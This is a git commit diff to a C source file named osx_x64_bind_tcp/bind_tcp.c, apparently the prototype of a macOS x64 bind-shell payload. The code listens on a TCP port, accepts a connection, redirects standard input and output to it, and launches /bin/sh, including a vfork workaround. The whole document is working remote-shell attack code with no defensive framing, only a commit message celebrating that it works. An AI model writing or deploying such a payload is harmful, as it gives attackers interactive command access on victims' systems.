46563358fee4852259363432225b8efa78a2b381
Jacob Hammack <jacob.hammack@hammackj.com>
2011-05-28 23:32:46 -0500

    WOOT c version works

--- osx_x64_bind_tcp/bind_tcp.c
+++ osx_x64_bind_tcp/bind_tcp.c
@@ -18,36 +18,26 @@ int main()
 { 
 	int fd, cfd;
 	struct sockaddr_in server_addr;
-	struct sockaddr_in client_addr;
         
-	fd = socket(PF_INET, SOCK_STREAM, 0);
+	fd = socket(AF_INET, SOCK_STREAM, 0);
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(PORT);
-	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-	memset(server_addr.sin_zero, 0, sizeof(server_addr.sin_zero));
+	server_addr.sin_addr.s_addr = 0; //htonl(INADDR_ANY);
 
-	bind(fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
+	bind(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
+	listen(fd, 5);
+	cfd = accept(fd, 0, 0);
 
-	listen(fd, 10);
-
-	while(1)	
+	if(execl(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
 	{
-		cfd = accept(fd, (struct sockaddr *) &client_addr, 16);
-	
-		dup2(cfd, 0); 
-		dup2(cfd, 1); 
-		dup2(cfd, 2);
+		vfork();
+	}
 
-		if(execl(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
-		{
-			vfork();
-		}
+	dup2(cfd, 0); 
+	dup2(cfd, 1); 
+	dup2(cfd, 2);
 
-		execl("/bin/sh", NULL, NULL);
-		close(cfd);
-		exit(0);
-	}        
-	close(fd);
+	execl("/bin/sh", NULL, NULL);
 	
 	return 0;
 }
